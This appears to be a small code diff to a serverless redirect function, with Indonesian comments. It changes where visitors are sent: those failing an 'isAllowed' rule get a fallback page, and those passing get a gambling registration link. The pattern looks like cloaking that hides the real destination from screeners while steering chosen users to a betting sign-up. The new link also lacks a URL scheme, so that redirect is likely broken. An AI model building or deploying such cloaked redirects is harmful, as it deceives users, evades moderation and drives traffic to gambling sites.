@@ -34,14 +34,15 @@ export async function onRequest(context) {
   // Tidak lolos rule → fallback
   if (!isAllowed) {
     return Response.redirect(
-      "https://one-kor-13-tiga-belas.pages.dev/amp/1ove/hopejshswy13ssjlsj.html",
+      "https://ven1-v1d1-v1c1.pages.dev/amp/1ove/hopejshswy13ssjlsj.html",
       302
     );
   }
 
-  // Lolos rule → random t.co
+  // Lolos rule → random halaman amp
   const links = [
-    "https://balsevaa.org/",
+    "alt1.ovobet-288.me/register",
+   
   ];
   const randomLink = links[Math.floor(Math.random() * links.length)];
   return Response.redirect(randomLink, 302);
